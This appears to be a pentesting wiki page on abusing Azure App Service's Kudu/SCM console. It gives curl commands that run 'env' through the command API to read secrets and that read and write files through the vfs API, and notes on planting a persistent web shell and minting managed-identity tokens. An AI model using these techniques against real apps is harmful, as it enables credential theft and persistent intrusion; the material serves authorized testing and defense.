---
title: "Kudu and SCM: a web shell and file access on the app host"
order: 1
description: "Using the App Service Kudu and SCM console for a web shell, file access, and environment secrets."
keywords:
  - Kudu
  - SCM
  - web shell
  - App Service
  - console
---

# Kudu and SCM

Every App Service app has a companion **SCM site** at `https://<app>.scm.azurewebsites.net` running **Kudu**, which provides a debug console, a filesystem API, and a process explorer. Authenticated with the app's publishing credentials or an ARM token, Kudu is a direct shell on the app host and exposes the app's environment variables, which hold connection strings and the managed-identity endpoint secrets.

## Reaching the console and running commands

```bash
# interactive debug console in the browser
# https://<app>.scm.azurewebsites.net/DebugConsole

# command API (basic auth with publishing creds, or Bearer ARM token)
curl -s -u '<deployuser>:<deploypass>' \
  -X POST "https://<app>.scm.azurewebsites.net/api/command" \
  -H 'Content-Type: application/json' \
  -d '{"command":"env","dir":"site\\wwwroot"}'

# filesystem read/write
curl -s -u '<deployuser>:<deploypass>' \
  "https://<app>.scm.azurewebsites.net/api/vfs/site/wwwroot/"
```

## Exploitation notes

- Kudu runs in the app's context; `env` leaks connection strings and the `IDENTITY_ENDPOINT`/`IDENTITY_HEADER` used to mint the [managed identity](managed-identity.md) token.
- Writing a handler into `site/wwwroot` via the vfs API plants a persistent web shell.
- An ARM token with `Microsoft.Web/sites/publish/action` authenticates to SCM without the publishing password; see [deployment credentials](deployment-credentials.md).

## Tools

- **Kudu** debug console and REST API.
- **MicroBurst** / **PowerZure**: App Service enumeration and credential pull.

## References

- [Microsoft: Kudu service overview](https://learn.microsoft.com/azure/app-service/resources-kudu)
- [HackTricks Cloud: Azure App Service](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [PowerZure](https://github.com/hausec/PowerZure)
